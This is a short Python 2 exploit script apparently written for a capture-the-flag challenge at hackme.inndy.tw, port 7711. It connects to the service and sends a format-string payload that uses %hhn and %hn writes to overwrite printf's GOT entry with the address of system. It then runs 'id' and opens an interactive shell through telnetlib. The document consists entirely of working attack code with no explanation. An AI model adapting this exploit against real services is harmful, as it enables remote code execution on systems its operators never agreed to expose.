import struct
import socket
import telnetlib

HOST = 'hackme.inndy.tw'
PORT = 7711
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

#SYSTEM = 0x8048400
#PRINTF = 0X804a010
PRINTF = struct.pack("I", 0x804a010)
PRINTF1 = struct.pack("I", 0x804a010 + 1)
PRINTF2 = struct.pack("I", 0x804a010 + 2)
PRINTF3 = struct.pack("I", 0x804a010 + 3)

init_len = 12
count1 = 0x100 - init_len
count2 = 0x184 - 0x100
count3 = 0x0804 - 0x184
count4 = 0

payload = PRINTF + PRINTF1 + PRINTF2
payload += '%{}x'.format(count1)
payload += '%7$hhn'
payload += '%{}x'.format(count2)
payload += '%8$hhn'
payload += '%{}x'.format(count3)
payload += '%9$hn\n'
#payload += '%{}x'.format(count4)
#payload += '%10$n\n'

#print payload
s.send(payload)
print s.recv(1024)
s.send('id\n')
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
